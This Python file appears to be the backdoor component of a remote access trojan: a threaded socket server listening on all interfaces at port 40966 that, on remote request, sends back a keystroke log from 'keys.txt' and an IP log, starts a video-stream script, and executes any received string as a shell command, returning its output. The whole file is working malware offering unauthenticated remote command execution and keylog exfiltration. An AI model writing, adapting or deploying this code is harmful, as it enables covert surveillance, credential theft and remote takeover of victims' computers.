import socket
from threading import Thread
import os
import sys
import subprocess

#Special Vars
PACKETSIZE = 6048

##Colors
class colors:
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

##Socket Vars
host = '0.0.0.0'
port = 40966

##Define Main Program
def handle(clientsocket):
    while True:
        recv = clientsocket.recv(PACKETSIZE).decode("UTF-8")
        if recv == 'getiplog':
            with open('iplog.txt', 'r') as f:
                output = f.read()
                clientsocket.send(str(output).encode("UTF-8"))
        if recv == 'getkeylog':
            with open('keys.txt', 'r') as f:
                output = f.read()
                clientsocket.send(str(output).encode("UTF-8"))
        if recv == 'getvid':
            print("Starting Video Stream")
            os.system('python vidserv.py')
        p = subprocess.Popen(recv, shell=True, stdout=subprocess.PIPE)
        output, err = p.communicate()
        clientsocket.send(str(output).encode("UTF-8"))
        print(colors.BLUE)
        os.system(recv)
        print(colors.END)


##Socks
servs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
servs.bind((host, port))
servs.listen(10)

##Threading and Accepting Connections
while 1:
    #accept connections from outside
    (clientsocket, address) = servs.accept()
    print(colors.GREEN + 'New Connection' + colors.END)
    #Multiple Threadsget
    ct = Thread(target=handle, args=(clientsocket,))
    print(colors.GREEN + 'Starting new thread')
    ct.start()
    print(colors.GREEN + colors.BOLD + 'Thread Started')